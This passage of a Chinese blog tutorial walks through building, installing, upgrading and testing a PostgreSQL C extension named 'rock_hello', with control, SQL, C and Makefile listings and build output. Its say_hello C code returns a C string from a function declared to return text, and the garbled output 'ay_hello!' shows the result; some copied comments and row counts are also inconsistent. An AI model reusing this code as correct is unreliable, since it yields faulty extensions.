class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">shell=# select * from pg_extension;</span><br><span class="line"> extname  | extowner | extnamespace | extrelocatable | extversion | extconfig | extcondition </span><br><span class="line"><span class="comment">----------+----------+--------------+----------------+------------+-----------+--------------</span></span><br><span class="line"> plpgsql  |       10 |           11 | f              | 1.0        |           | </span><br><span class="line"> oraftops |       10 |         8001 | f              | 1.0        |           | </span><br><span class="line">(2 rows)</span><br></pre></td></tr></table></figure><h3 id="插件编写"><a href="#插件编写" class="headerlink" title="插件编写"></a>插件编写</h3><p>通常一个 PostgreSQL 内核插件包括下面的部分</p><ol><li>包含功能的逻辑的动态库，即 so 文件。</li><li>描述插件信息的的控制文件，即 control 文件。</li><li>一组文件用于创建、更新和删除插件，这是一组按照版本命名的 SQL 文本文件。</li></ol><h4 id="新建插件"><a href="#新建插件" class="headerlink" title="新建插件"></a>新建插件</h4><p>为了进行<code>create extension</code>命令加载扩展,必须存在以下两个文件:</p><ul><li><code>extension_name.control</code> 控制文件，声明该扩展的基础信息。</li><li><code>extension--version.sql</code> 加载扩展所需要执行的SQL文件。</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">4 -rw-rw-r--. 1 Pg Pg    475 Aug  7 14:56 file_fdw--1.0.sql</span><br><span class="line">4 -rw-rw-r--. 1 Pg Pg    155 Aug  7 14:56 file_fdw.control</span><br><span class="line">4 -rw-rw-r--. 1 Pg Pg    467 Aug  7 14:56 Makefile</span><br><span class="line">4 -rw-rw-r--. 1 Pg Pg    382 Aug 30 12:42 rock_hello.c</span><br></pre></td></tr></table></figure><p><strong>代码如下:</strong></p><h5 id="rock-hello-control"><a href="#rock-hello-control" class="headerlink" title="rock_hello.control"></a><code>rock_hello.control</code></h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># rock_hello extension</span><br><span class="line">comment = &apos;foreign-data wrapper for flat file access&apos;</span><br><span class="line">default_version = &apos;1.0&apos;</span><br><span class="line">module_pathname = &apos;$libdir/rock_hello&apos;</span><br><span class="line">relocatable = true</span><br></pre></td></tr></table></figure><h5 id="rock-hello-1-0-sql"><a href="#rock-hello-1-0-sql" class="headerlink" title="rock_hello--1.0.sql"></a><code>rock_hello--1.0.sql</code></h5><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* contrib/rock_hello/rock_hello--1.0.sql */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- complain if script is sourced in psql, rather than via CREATE EXTENSION</span></span><br><span class="line">\echo <span class="keyword">Use</span> <span class="string">"create EXTENSION rock_hello"</span> <span class="keyword">to</span> <span class="keyword">load</span> this file. \quit</span><br><span class="line"></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">FUNCTION</span> say_hello() </span><br><span class="line"><span class="keyword">RETURNS</span> <span class="built_in">text</span></span><br><span class="line"><span class="keyword">AS</span> <span class="string">'MODULE_PATHNAME'</span></span><br><span class="line"><span class="comment">--AS '$libdir/rock_hello'</span></span><br><span class="line"><span class="keyword">LANGUAGE</span> C <span class="keyword">STRICT</span>;</span><br></pre></td></tr></table></figure><h5 id="rock-hello-c"><a href="#rock-hello-c" class="headerlink" title="rock_hello.c"></a><code>rock_hello.c</code></h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"postgres.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"fmgr.h"</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> PG_MODULE_MAGIC</span></span><br><span class="line">PG_MODULE_MAGIC;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">PG_FUNCTION_INFO_V1(say_hello);</span><br><span class="line"></span><br><span class="line"><span class="function">Datum <span class="title">say_hello</span><span class="params">(PG_FUNCTION_ARGS)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span>* arg = PG_GETARG_CSTRING(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    PG_RETURN_CSTRING(<span class="string">"say_hello!"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>以上代码中.h 数据类型与函数 查看上一篇，Pg添加共享库。</p></blockquote><h5 id="Makefile"><a href="#Makefile" class="headerlink" title="Makefile"></a><strong>Makefile</strong></h5><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># contrib/rock_hello/Makefile</span></span><br><span class="line">MODULES = rock_hello</span><br><span class="line"></span><br><span class="line"><span class="comment">## 扩展名称;</span></span><br><span class="line">EXTENSION = rock_hello</span><br><span class="line"></span><br><span class="line"><span class="comment">## 扩展安装的SQL文件;</span></span><br><span class="line">DATA = rock_hello--1.0.sql</span><br><span class="line"></span><br><span class="line"><span class="comment">## 扩展描述;</span></span><br><span class="line">PGFILEDESC = <span class="string">"rock_hello - foreign data wrapper for files"</span></span><br><span class="line"></span><br><span class="line"><span class="comment">### 以下为Pg构建扩展相关命令;</span></span><br><span class="line"><span class="keyword">ifdef</span> USE_PGXS</span><br><span class="line">PG_CONFIG = pg_config</span><br><span class="line">PGXS := <span class="variable">$(<span class="built_in">shell</span> <span class="variable">$(PG_CONFIG)</span> --pgxs)</span></span><br><span class="line"><span class="keyword">include</span> <span class="variable">$(PGXS)</span>  <span class="comment">## 环境变量参数加载;</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">subdir = contrib/rock_hello</span><br><span class="line">top_builddir = ../..</span><br><span class="line"><span class="keyword">include</span> <span class="variable">$(top_builddir)</span>/src/Makefile.global</span><br><span class="line"><span class="keyword">include</span> <span class="variable">$(top_srcdir)</span>/contrib/contrib-global.mk</span><br><span class="line"><span class="keyword">endif</span></span><br></pre></td></tr></table></figure><h5 id="编译并加载"><a href="#编译并加载" class="headerlink" title="编译并加载"></a>编译并加载</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">[Pg@yfslcentos71 rock_hello]$ make</span><br><span class="line">[Pg@yfslcentos71 rock_hello]$ sudo make install </span><br><span class="line">[Pg@yfslcentos71 rock_hello]$ psql</span><br><span class="line">Pg=# create extension rock_hello;</span><br><span class="line">CREATE EXTENSION</span><br><span class="line">Pg=# </span><br><span class="line">Pg=# </span><br><span class="line">Pg=# select * from pg_extension;</span><br><span class="line">  extname   | extowner | extnamespace | extrelocatable | extversion | extconfig | extcondition </span><br><span class="line">------------+----------+--------------+----------------+------------+-----------+--------------</span><br><span class="line"> plpgsql    |       10 |           11 | f              | 1.0        |           | </span><br><span class="line"> oraftops   |       10 |         8001 | f              | 1.0        |           | </span><br><span class="line"> rock_hello |       10 |         2200 | t              | 1.0        |           | </span><br><span class="line">(3 rows)</span><br><span class="line">Pg=# select say_hello();</span><br><span class="line"> say_hello </span><br><span class="line">-----------</span><br><span class="line"> ay_hello!</span><br><span class="line">(1 row)</span><br></pre></td></tr></table></figure><h4 id="插件更新"><a href="#插件更新" class="headerlink" title="插件更新"></a>插件更新</h4><p>有时候，我们需要做插件的 BUGFIX ，或定制一些功能。这就用到了插件更新功能。</p><ul><li><p>首先，我们需要升级插件的小版本</p><p>修改控制文件 <code>.control,</code> 增加一个小版本，如果当前版本是 1.0，则文件中版本号修改成 1.1</p></li><li><p>添加新版本的的 <code>DDL SQL</code>文件    ==&gt; 全部DDL.sql</p><p><strong>添加新版本的<code>DDL SQ</code>L 文件<code>*–1.1.sql</code>, 用于从零创建该插件。</strong></p><p><strong>该 SQL 文件应该包括该插件的所有对象的 DDL。</strong></p></li><li><p>添加用户老版本升级到新版本的<code>DDL SQL</code>文件   ==&gt; 升级操作DDL.sql</p><p><strong>创建 <code>*1.0–-1.1.sql</code>，用于从版本 1.0升级到 1.1</strong></p><p>该 SQL 文件<strong>只包含 1.1版本中新创建的对象。</strong>用户的升级操作会调用该 SQL 文件，从而避免了完全重新创建。</p></li><li><p>修改源码添加新的功能，编译并安装到指定目录。 <code>C源码编写</code></p></li><li><p>使用 SQL 升级小版本</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">alter</span> extension postgres_fdw <span class="keyword">update</span>;</span><br></pre></td></tr></table></figure></li></ul><p>如果成功更新，我们能从视图中看到对应的小版本号被更新了。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">postgres=# select * from pg_extension ;</span><br><span class="line">   extname    | extowner | extnamespace | extrelocatable | extversion | extconfig | extcondition </span><br><span class="line"><span class="comment">--------------+----------+--------------+----------------+------------+-----------+--------------</span></span><br><span class="line">rock_hello |       10 |         2200 | t              | 1.1        |           | </span><br><span class="line">(2 rows)</span><br></pre></td></tr></table></figure><p>使用 PostgreSQL 的插件管理功能，用户很容开发和维护需要的插件。</p><p><strong>新增pg_say_name函数:</strong></p><h5 id="rock-hello-control-1"><a href="#rock-hello-control-1" class="headerlink" title="rock_hello.control"></a><code>rock_hello.control</code></h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># rock_hello extension</span><br><span class="line">comment = &apos;foreign-data wrapper for flat file access&apos;</span><br><span class="line">default_version = &apos;1.1&apos;     ## 更改版本号</span><br><span class="line">module_pathname = &apos;$libdir/rock_hello&apos;</span><br><span class="line">relocatable = true</span><br></pre></td></tr></table></figure><h5 id="rock-hello-1-1-sql"><a href="#rock-hello-1-1-sql" class="headerlink" title="rock_hello--1.1.sql"></a><code>rock_hello--1.1.sql</code></h5><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* contrib/rock_hello/rock_hello--1.1.sql */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- complain if script is sourced in psql, rather than via CREATE EXTENSION</span></span><br><span class="line">\echo <span class="keyword">Use</span> <span class="string">"create EXTENSION rock_hello"</span> <span class="keyword">to</span> <span class="keyword">load</span> this file. \quit</span><br><span class="line"></span><br><span class="line"><span class="comment">--- 以前DDL</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">FUNCTION</span> say_hello() </span><br><span class="line"><span class="keyword">RETURNS</span> <span class="built_in">text</span></span><br><span class="line"><span class="keyword">AS</span> <span class="string">'MODULE_PATHNAME'</span></span><br><span class="line"><span class="comment">--AS '$libdir/rock_hello'</span></span><br><span class="line"><span class="keyword">LANGUAGE</span> C <span class="keyword">STRICT</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">--- 新增处理函数;</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">FUNCTION</span> pg_say_name(<span class="built_in">text</span>) </span><br><span class="line"><span class="keyword">RETURNS</span> <span class="built_in">text</span></span><br><span class="line"><span class="keyword">AS</span> <span class="string">'MODULE_PATHNAME'</span> </span><br><span class="line"><span class="comment">--AS '$libdir/rock_hello'</span></span><br><span class="line"><span class="keyword">LANGUAGE</span> C <span class="keyword">STRICT</span>;</span><br></pre></td></tr></table></figure><h5 id="rock-hello-1-0-1-1-sql-升级DDL"><a href="#rock-hello-1-0-1-1-sql-升级DDL" class="headerlink" title="rock_hello--1.0--1.1.sql 升级DDL"></a><code>rock_hello--1.0--1.1.sql</code> 升级DDL</h5><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* contrib/rock_hello/rock_hello--1.0--1.1.sql */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- complain if script is sourced in psql, rather than via CREATE EXTENSION</span></span><br><span class="line">\echo <span class="keyword">Use</span> <span class="string">"alter EXTENSION rock_hello update to 1.1"</span> <span class="keyword">to</span> <span class="keyword">load</span> this file. \quit</span><br><span class="line"><span class="comment">-- 新增Function;</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">FUNCTION</span> pg_say_name(<span class="built_in">text</span>) </span><br><span class="line"><span class="keyword">RETURNS</span> <span class="built_in">text</span></span><br><span class="line"><span class="keyword">AS</span> <span class="string">'MODULE_PATHNAME'</span> </span><br><span class="line"><span class="comment">--AS '$libdir/rock_hello'</span></span><br><span class="line"><span class="keyword">LANGUAGE</span> C <span class="keyword">STRICT</span>;</span><br></pre></td></tr></table></figure><h5 id="Makefile-1"><a href="#Makefile-1" class="headerlink" title="Makefile"></a>Makefile</h5><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># contrib/rock_hello/Makefile</span></span><br><span class="line">MODULES = rock_hello</span><br><span class="line"></span><br><span class="line"><span class="comment">## 扩展名称;</span></span><br><span class="line">EXTENSION = rock_hello</span><br><span class="line"></span><br><span class="line"><span class="comment">## 扩展安装的SQL文件;</span></span><br><span class="line">DATA = rock_hello--1.1.sql  rock_hello--1.0--1.1.sql</span><br><span class="line"></span><br><span class="line"><span class="comment">## 扩展描述;</span></span><br><span class="line">PGFILEDESC = <span class="string">"rock_hello - foreign data wrapper for files"</span></span><br><span class="line"></span><br><span class="line"><span class="comment">### 以下为Pg构建扩展相关命令;</span></span><br><span class="line"><span class="keyword">ifdef</span> USE_PGXS</span><br><span class="line">PG_CONFIG = pg_config</span><br><span class="line">PGXS := <span class="variable">$(<span class="built_in">shell</span> <span class="variable">$(PG_CONFIG)</span> --pgxs)</span></span><br><span class="line"><span class="keyword">include</span> <span class="variable">$(PGXS)</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">subdir = contrib/rock_hello</span><br><span class="line">top_builddir = ../..</span><br><span class="line"><span class="keyword">include</span> <span class="variable">$(top_builddir)</span>/src/Makefile.global</span><br><span class="line"><span class="keyword">include</span> <span class="variable">$(top_srcdir)</span>/contrib/contrib-global.mk</span><br><span class="line"><span class="keyword">endif</span></span><br></pre></td></tr></table></figure><h5 id="编译并加载-1"><a href="#编译并加载-1" class="headerlink" title="编译并加载"></a>编译并加载</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">[Pg@yfslcentos71 rock_hello]$ make</span><br><span class="line">[Pg@yfslcentos71 rock_hello]$ sudo make install </span><br><span class="line">[Pg@yfslcentos71 rock_hello]$ psql</span><br><span class="line">Pg=# alter  extension rock_hello update;</span><br><span class="line">ALTER EXTENSION</span><br><span class="line">Pg=# </span><br><span class="line">Pg=# select * from pg_extension;</span><br><span class="line">  extname   | extowner | extnamespace | extrelocatable | extversion | extconfig | extcondition </span><br><span class="line">------------+----------+--------------+----------------+------------+-----------+--------------</span><br><span class="line"> plpgsql    |       10 |           11 | f              | 1.0        |           | </span><br><span class="line"> oraftops   |       10 |         8001 | f              | 1.0        |           | </span><br><span class="line"> rock_hello |       10 |         2200 | t              | 1.1        |           | </span><br><span class="line">(3 rows)</span><br><span class="line"></span><br><span class="line">Pg=# </span><br><span class="line">Pg=# select pg_say_name(&apos;nihao&apos;);</span><br><span class="line"> pg_say_name </span><br><span class="line">-------------</span><br><span class="line"> nihao</span><br><span class="line">(1 row)</span><br></pre></td></tr></table></figure><h4 id="编译过程分析"><a href="#编译过程分析" class="headerlink" title="编译过程分析"></a>编译过程分析</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">[Pg@yfslcentos71 rock_hello]$ make</span><br><span class="line">gcc -Wall -Wmissing-prototypes -Wpointer-arith -Wdeclaration-after-statement -Wendif-labels -Wmissing-format-attribute -Wformat-security -fno-strict-aliasing -fwrapv -fexcess-precision=standard -g -fPIC -I. -I. -I../../src/include  -D_GNU_SOURCE   -c -o rock_hello.o rock_hello.c</span><br><span class="line">rock_hello.c: In function ‘say_hello’:</span><br><span class="line">rock_hello.c:15:11: warning: unused variable ‘arg’ [-Wunused-variable]</span><br><span class="line">     char* arg = PG_GETARG_CSTRING(0);</span><br><span class="line">           ^</span><br><span class="line">gcc -Wall -Wmissing-prototypes -Wpointer-arith -Wdeclaration-after-statement -Wendif-labels -Wmissing-format-attribute -Wformat-security -fno-strict-aliasing -fwrapv -fexcess-precision=standard -g -fPIC -L../../src/port -L../../src/common -Wl,--as-needed -Wl,-rpath,'/usr/local/postgresql/lib',--enable-new-dtags  -shared -o rock_hello.so rock_hello.o</span><br><span class="line">[Pg@yfslcentos71 rock_hello]$ make install </span><br><span class="line">/usr/bin/mkdir -p '/usr/local/postgresql/share/extension'</span><br><span class="line">/usr/bin/mkdir -p '/usr/local/postgresql/share/extension'</span><br><span class="line">/usr/bin/mkdir -p '/usr/local/postgresql/lib'</span><br><span class="line">/usr/bin/install -c -m 644 ./rock_hello.control '/usr/local/postgresql/share/extension/'</span><br><span class="line">/usr/bin/install: cannot create regular file ‘/usr/local/postgresql/share/extension/rock_hello.control’: Permission denied</span><br><span class="line">make: *** [install] Error 1</span><br><span class="line">[Pg@yfslcentos71 rock_hello]$ </span><br><span class="line">[Pg@yfslcentos71 rock_hello]$ sudo make install </span><br><span class="line">[sudo] password for Pg: </span><br><span class="line">/usr/bin/mkdir -p '/usr/local/postgresql/share/extension'</span><br><span class="line">/usr/bin/mkdir -p '/usr/local/postgresql/share/extension'</span><br><span class="line">/usr/bin/mkdir -p '/usr/local/postgresql/lib'</span><br><span class="line">/usr/bin/install -c -m 644 ./rock_hello.control '/usr/local/postgresql/share/extension/'</span><br><span class="line">/usr/bin/install -c -m 644 ./rock_hello--1.0.sql  '/usr/local/postgresql/share/extension/'</span><br><span class="line">/usr/bin/install -c -m 755  rock_hello.so '/usr/local/postgresql/lib/'</span><br></pre></td></tr></table></figure><p>我们发现make过程中添加了 <code>-fPIC</code> <code>-shared</code>， 实际此处是编译成共享库的过程。 </p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Pg=# select proname,prolang, prorettype,proargtypes, prosrc,probin from pg_proc where probin like '%rock_hello%';</span><br><span class="line">   proname   | prolang | prorettype | proargtypes |   prosrc    |       probin       </span><br><span class="line"><span class="comment">-------------+---------+------------+-------------+-------------+--------------------</span></span><br><span class="line"> say_hello   |      13 |         25 |             | say_hello   | $libdir/rock_hello</span><br><span class="line"> pg_say_name |      13 |         25 | 25          | pg_say_name | $libdir/rock_hello</span><br></pre></td></tr></table></figure><h4 id="测试-make-installcheck-未完"><a href="#测试-make-installcheck-未完" class="headerlink" title="测试 make installcheck (未完)"></a>测试 <code>make installcheck</code> (未完)</h4><p><strong>Makefile</strong></p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## list of regression test cases;</span></span><br><span class="line">REGRESS = rock_hello</span><br><span class="line"></span><br><span class="line"><span class="comment">## extra files to remove in make clean </span></span><br><span class="line">EXTRA_CLEAN = sql/rock_hello.sql expected/rock_hello.out</span><br></pre></td></tr></table></figure><p><code>make installcheck</code> 会调用psql执行每一个测试脚本，并将结果输出与相应的预期输出进行比较。</p><ul><li>测试脚本必须在sql目录中出现。</li><li>expected目录放置一个包含预期输出的文件。</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">[Pg@yfslcentos71 rock_hello]$ make installcheck</span><br><span class="line">make -C ../../src/test/regress pg_regress</span><br><span class="line">make[1]: Entering directory `/home/Pg/hgdb-core/src/test/regress&apos;</span><br><span class="line">make -C ../../../src/port all</span><br><span class="line">make[2]: Entering directory `/home/Pg/hgdb-core/src/port&apos;</span><br><span class="line">make -C ../backend submake-errcodes</span><br><span class="line">make[3]: Entering directory `/home/Pg/hgdb-core/src/backend&apos;</span><br><span class="line">make[3]: Nothing to be done for `submake-errcodes&apos;.</span><br><span class="line">make[3]: Leaving directory `/home/Pg/hgdb-core/src/backend&apos;</span><br><span class="line">make[2]: Leaving directory `/home/Pg/hgdb-core/src/port&apos;</span><br><span class="line">make -C ../../../src/common all</span><br><span class="line">make[2]: Entering directory `/home/Pg/hgdb-core/src/common&apos;</span><br><span class="line">make -C ../backend submake-errcodes</span><br><span class="line">make[3]: Entering directory `/home/Pg/hgdb-core/src/backend&apos;</span><br><span class="line">make[3]: Nothing to be done for `submake-errcodes&apos;.</span><br><span class="line">make[3]: Leaving directory `/home/Pg/hgdb-core/src/backend&apos;</span><br><span class="line">make[2]: Leaving directory `/home/Pg/hgdb-core/src/common&apos;</span><br><span class="line">make[1]: Leaving directory `/home/Pg/hgdb-core/src/test/regress&apos;</span><br><span class="line">../../src/test/regress/pg_regress --inputdir=. --bindir=&apos;/usr/local/postgresql/bin&apos;    --dbname=contrib_regression rock_hello</span><br><span class="line">(using postmaster on Unix socket, default port)</span><br><span class="line">============== dropping database &quot;contrib_regression&quot; ==============</span><br><span class="line">NOTICE:  database &quot;contrib_regression&quot; does not exist, skipping</span><br><span class="line">DROP DATABASE</span><br><span class="line">============== creating database &quot;contrib_regression&quot; ==============</span><br><span class="line">CREATE DATABASE</span><br><span class="line">ALTER DATABASE</span><br><span class="line">============== dropping extension &quot;oraftops&quot;          ==============</span><br></pre></td></tr></table></figure><h4 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h4><p><strong>Makefile变量设置</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">MODULES</span><br><span class="line">list of shared-library objects to be built from source files with same stem (do not include library suffixes in this list)</span><br><span class="line"></span><br><span class="line">MODULE_big</span><br><span class="line">a shared library to build from multiple source files (list object files in OBJS)</span><br><span class="line"></span><br><span class="line">PROGRAM</span><br><span class="line">an executable program to build (list object files in OBJS)</span><br><span class="line"></span><br><span class="line">The following variables can also be set:</span><br><span class="line"></span><br><span class="line">EXTENSION</span><br><span class="line">extension name(s); for each name you must provide an extension.control file, which will be installed into prefix/share/extension</span><br><span class="line"></span><br><span class="line">MODULEDIR</span><br><span class="line">subdirectory of prefix/share into which DATA and DOCS files should be installed (if not set, default is extension if EXTENSION is set, or contrib if not)</span><br><span class="line"></span><br><span class="line">DATA</span><br><span class="line">random files to install into prefix/share/$MODULEDIR</span><br><span class="line"></span><br><span class="line">DATA_built</span><br><span class="line">random files to install into prefix/share/$MODULEDIR, which need to be built first</span><br><span class="line"></span><br><span class="line">DATA_TSEARCH</span><br><span class="line">random files to install under prefix/share/tsearch_data</span><br><span class="line"></span><br><span class="line">DOCS</span><br><span class="line">random files to install under prefix/doc/$MODULEDIR</span><br><span class="line"></span><br><span class="line">SCRIPTS</span><br><span class="line">script files (not binaries) to install into prefix/bin</span><br><span class="line"></span><br><span class="line">SCRIPTS_built</span><br><span class="line">script files (not binaries) to install into prefix/bin, which need to be built first</span><br><span class="line"></span><br><span class="line">REGRESS</span><br><span class="line">list of regression test cases (without suffix), see below</span><br><span class="line"></span><br><span class="line">REGRESS_OPTS</span><br><span class="line">additional switches to pass to pg_regress</span><br><span class="line"></span><br><span class="line">EXTRA_CLEAN</span><br><span class="line">extra files to remove in make clean</span><br><span class="line"></span><br><span class="line">PG_CPPFLAGS</span><br><span class="line">will be added to CPPFLAGS</span><br><span class="line"></span><br><span class="line">PG_LIBS</span><br><span class="line">will be added to PROGRAM link line</span><br><span class="line"></span><br><span class="line">SHLIB_LINK</span><br><span class="line">will be added to MODULE_big link line</span><br><span class="line"></span><br><span class="line">PG_CONFIG</span><br><span class="line">path to pg_config program for the PostgreSQL installation to build against (typically just pg_config to use the first one in your PATH)</span><br></pre></td></tr></table></figure><ul><li>插件是通过动态库形式引入到内核中。和内核在同一个进程中运行，且没有内存保护，影响内核的稳定性。开发中需要特别注意内存的使用。不要造成内存泄露或越界写。建议使用 PostgreSQL 